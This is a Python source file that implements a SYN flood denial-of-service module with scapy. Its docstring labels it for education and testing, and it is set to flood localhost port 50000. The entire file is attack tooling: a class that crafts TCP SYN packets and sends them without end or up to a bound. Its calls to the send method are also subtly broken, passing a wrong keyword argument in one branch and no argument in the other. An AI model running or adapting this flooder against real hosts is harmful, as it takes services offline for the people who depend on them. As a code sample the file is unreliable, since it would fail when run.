"""
Author: Daniel Sapojnikov.
Syn flood DDoS attack module for education purposes and testing.
"""

from scapy.all import *
from scapy.all import conf
from scapy.layers.inet import IP, TCP

LOG = '[+]'
ERROR = '[!]'
SYN_FLAG = 0x02

class SynFlood:
    def __init__(self, target: tuple[str, int]=tuple(), bound='infi') -> None:
        """
        Syn flood object.

        Args:
            target (tuple, optional): Target addr (ip, port) we want to flood. Defaults to Empty tuple.
            bound (_type_, optional): Upper bound of packets. Defaults to None aka infinity.
        """
        self.__bound = bound
        self.__syn_counter = 0
        self.__src_ip = 'localhost'
        self.__dst_ip, self.__dport = target
    
    def __generate_syn(self, src_ip: str='localhost', dst_ip: str='localhost', dport: int=50000) -> scapy.packet:
        """
        Returns:
            scapy.packet: syn packet.
        """
        return IP(src=src_ip, dst=dst_ip) / TCP(dport=dport, flags=SYN_FLAG) 
        
    def __send_syn(self, condition) -> None:
        """
        Sends a single syn packet to target.
        """ 
        syn_packet = self.__generate_syn(self.__src_ip, self.__dst_ip, self.__dport)
        send(syn_packet, loop=condition)           
        self.__syn_counter += 1
        
    def start(self) -> None:
        """
        Floods self.__target with syn packets until a bound it met.
        """
        if self.__bound == 'infi':
            try: 
                self.__send_syn(loop=True)
            except KeyboardInterrupt:
                pass
        else: 
            while self.__syn_counter < self.__bound:
                self.__send_syn()
        print(f'{LOG} Attack stopped! syns: {self.__syn_counter}')

flooder = SynFlood(target=('localhost', 50000))
flooder.start()
        